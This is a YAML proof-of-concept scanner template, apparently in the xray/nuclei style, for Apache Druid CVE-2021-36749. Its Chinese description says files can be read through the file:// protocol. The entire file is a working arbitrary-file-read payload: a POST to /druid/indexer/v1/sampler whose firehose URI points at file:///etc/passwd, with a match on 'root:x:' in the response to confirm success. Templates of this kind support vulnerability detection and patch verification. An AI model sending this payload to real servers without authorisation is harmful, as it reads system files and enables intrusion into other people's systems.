name: poc-yaml-Druidun-cve-2021-36749
description: "可使用使用file://协议进行读取文件"
method: POST
headers:
  Content-Type: "application/json"
body: >
  {
    "type":"index",
    "spec":{
      "type":"index",
      "ioConfig":{
        "type":"index",
        "firehose":{
          "type":"http",
          "uris":["file:///etc/passwd"]
        }
      },
      "dataSchema":{
        "dataSource":"sample",
        "parser":{
          "type":"string",
          "parseSpec":{
            "format":"regex",
            "pattern":"(.*)",
            "columns":["a"],
            "dimensionsSpec":{},
            "timestampSpec":{
              "column":"!!!_no_such_column_!!!",
              "missingValue":"2010-01-01T00:00:00Z"
            }
          }
        }
      }
    },
    "samplerConfig":{
      "numRows":500,
      "timeoutMs":15000
    }
  }
path:
  - "/druid/indexer/v1/sampler?for=connect"
expression:
  status: 200
  body_any:
    - "root:x:"